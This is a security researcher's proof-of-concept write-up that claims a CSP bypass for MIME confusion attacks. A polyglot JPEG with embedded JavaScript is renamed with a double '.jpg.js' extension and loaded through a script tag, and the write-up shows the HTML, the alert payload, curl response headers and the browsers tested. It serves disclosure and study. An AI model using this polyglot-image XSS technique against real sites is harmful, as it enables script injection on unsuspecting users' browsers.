# Bypass CSP against MIME Confusion Attack

Major browsers have implemented Content Security Policy against MIME confusion attacks since 2018, reported by CVE-2018-5164 and CVE-2019-19916 (my report) which use polyglot image files (GIF, JPG ...) with embedded JavaScript code (as described here: https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/ and here https://github.com/V1n1v131r4/MIME-Confusion-Attack-on-Midori-Browser).

But based on my studies I found a way to bypass CSP and perform Cross-Site Script (XSS) attacks by exploiting the MIME Type of the HTTP header.


## Proof of concept Step-by-step

The image used in this PoC is as follows

![alt](https://ciber.sejalivre.org/WP/2x.jpg)


Available here: http://portswigger-labs.net/polyglot/jpeg/xss_within_header_compressed_small_logo.jpg


These are the image strings with the embedded JS code:

![alt](https://ciber.sejalivre.org/WP/xxd.png)


The inline JavaScript code was this:
```
*/=alert("Burp rocks.")/*
```

The PoC website is hosted at: 

* Scenario 1: http://joomla.sejalivre.org/index.html

* Scenario 2: http://joomla.sejalivre.org/index2.html


## Scenario 1

CSP's correct behavior in HTTP MIME Type is not to allow an image file with embedded JavaScript code to be read as script, as below the HTML/JS code below:

```
<html>
     <img src="2x.jpg">
	   <script src="2x.jpg"></script>
 </html>
```

Below is the browser blocking MIME confusion attack via its Content Security Policy:

![alt](https://ciber.sejalivre.org/WP/console1.png)


## Scenario 2 - The Bypass

I managed to bypass CSP by stating more than one extension in the image file with embedded JavaScript code, like this:

```
<html>
     <img src="2x.jpg.js">
	   <script src="2x.jpg.js"></script>
 </html>
```

So the image continues to be read as script by `<script>` tag and as image by `<img>` tag.

Note that the image file is the same as both scenarios, only its extension has been changed.

Below is the browser allowing MIME confusion attack by bypass in your Content Security Policy

![alt](https://ciber.sejalivre.org/WP/console2.png)






Here are HTTP Response on both scenarios:

```
$ curl -I http://joomla.sejalivre.org/2x.jpg
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 22 Dec 2019 06:26:44 GMT
Content-Type: image/jpeg
Content-Length: 3318
Connection: keep-alive
Last-Modified: Thu, 19 Dec 2019 20:38:08 GMT
Expires: Thu, 20 Feb 2020 06:26:44 GMT
Cache-Control: max-age=5184000
Pragma: public
Accept-Ranges: bytes
```

```
$ curl -I http://joomla.sejalivre.org/2x.jpg.js
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 22 Dec 2019 06:26:12 GMT
Content-Type: application/javascript
Content-Length: 3318
Connection: keep-alive
Vary: Accept-Encoding
Last-Modified: Fri, 20 Dec 2019 21:27:54 GMT
Expires: Tue, 21 Jan 2020 06:26:12 GMT
Cache-Control: max-age=2592000
Pragma: public
Accept-Ranges: bytes
```


In the first scenario webserver sends the image as Content-Type:image/jpeg.  In the second it is sent as Content-Type:application/javascript due to the change of file extension.

## Browsers and servers tested

This PoC has been tested on the following scenarios:

* Nginx (on cPanel 82)
* Apache 2.4.41
* Mozilla Firefox < 71.0 (Windows, Linux and Android)
* Google Chrome < 79.0.3945.88 (Windows, Linux and Android)
* Google Chromium < 81.0.4003.0 (Windows and Linux)
* Apple Safari 13.0.4 < (MacOS Catalina)
* Opera 60 - R3 < (Windows and Linux)
* Microsoft Edge < 44.18362.449.0 (Windows 10)
* Microsoft Internet Explorer < 11 (Windows 10)


## Screenshots

Below are some screenshots of PoC

Google Chrome
![alt](https://ciber.sejalivre.org/WP/chrome.png)

Google Chromium
![alt](https://ciber.sejalivre.org/WP/chromium.png)

Mozilla Firefox
![alt](https://ciber.sejalivre.org/WP/Firefox.png)

Opera
![alt](https://ciber.sejalivre.org/WP/opera.png)

Safari
![alt](https://ciber.sejalivre.org/WP/Safari.jpeg)

Edge
![alt](https://ciber.sejalivre.org/WP/edge.png)

IE
![alt](https://ciber.sejalivre.org/WP/IE.png)

